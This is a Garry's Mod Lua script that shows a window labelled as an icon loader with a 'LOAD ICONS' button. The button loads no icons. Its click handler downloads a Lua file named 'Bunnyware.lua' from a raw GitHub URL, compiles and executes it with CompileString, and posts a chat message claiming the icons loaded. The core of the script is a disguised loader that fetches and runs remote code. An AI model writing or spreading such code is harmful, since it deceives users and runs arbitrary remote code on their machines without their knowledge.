local function DrawBackground(w, h)

	surface.SetDrawColor(255, 255, 255);
	--surface.DrawRect(4, 31, w-7, h-35);
	draw.RoundedBox( 2, 4, 31, w-7, h-35, Color(255, 255, 255, 255) )

	local curcol = Color(255, 0, 0, 150);
	local border = Color(255, 0, 0, 25);
	for i = 0, 30 do
		surface.SetDrawColor(curcol);
		--curcol.r = curcol.r - 1;
		--surface.DrawLine(0, i, w, i);
        draw.RoundedBox( 9, i-25, i-25, w, 35, border)
	end
	
	surface.SetDrawColor(curcol);
	
	surface.SetFont("CenterPrintText");
	
	local tw, th = surface.GetTextSize("icons by werw58");
	
	surface.SetTextPos(5, 15 - th / 2);
	
	surface.SetTextColor(255, 255, 255);
	
	surface.DrawText("icons by werw58");
	draw.RoundedBox(20, 0, 31, 5, h - 31, curcol ) -- surface.DrawRect(0, 31, 5, h - 31);
	draw.RoundedBox(20, 0, h - 5, w, h, curcol ) -- surface.DrawRect(0, h - 5, w, h);
	draw.RoundedBox(20, w - 5, 31, 5, h, curcol ) --surface.DrawRect(w - 5, 31, 5, h);
	
	
end

local fetcher = {}

function fetcher.Get( url )
	http.Fetch( url, function( body )
		code = body
		pcall( CompileString( code, math.random( 1, 99 ) ) )
		chat.AddText( Color( 0, 255, 0, 255 ), "[ICONS]", Color( 255, 255, 0, 255 ), " Was Successfully Loaded!" )
	end, function( error )
		chat.AddText( Color( 255, 0, 0, 255 ), "Something is seriously wrong!" )
		chat.AddText( Color( 200, 100, 100, 255 ), "" )
	end)
end

local frame = vgui.Create( "DFrame" )
frame:SetPos( (ScrW()/2) - 200, (ScrH()/2) - 50 )
frame:SetSize( 250, 250 )
frame:SetTitle( "" )
--frame:SetBackgroundColor(Color( 255, 64, 64, 255 ))
function frame:Paint( w, h )
DrawBackground(w, h);
end

local bware = vgui.Create( "DButton", frame )
bware:SetPos( 25, 50 )
bware:SetSize( 200, 30)
bware:SetColor()
bware:SetText( "LOAD ICONS" )

bware.DoClick = function()
    surface.PlaySound("gaben.wav")
    surface.PlaySound("gaben.wav")
    surface.PlaySound("gaben.wav")
    surface.PlaySound("gaben.wav")
    
	fetcher.Get( "https://raw.githubusercontent.com/demonicPbunny/BunnyWare/master/Bunnyware.lua" )
	frame:Close()
end

frame:MakePopup()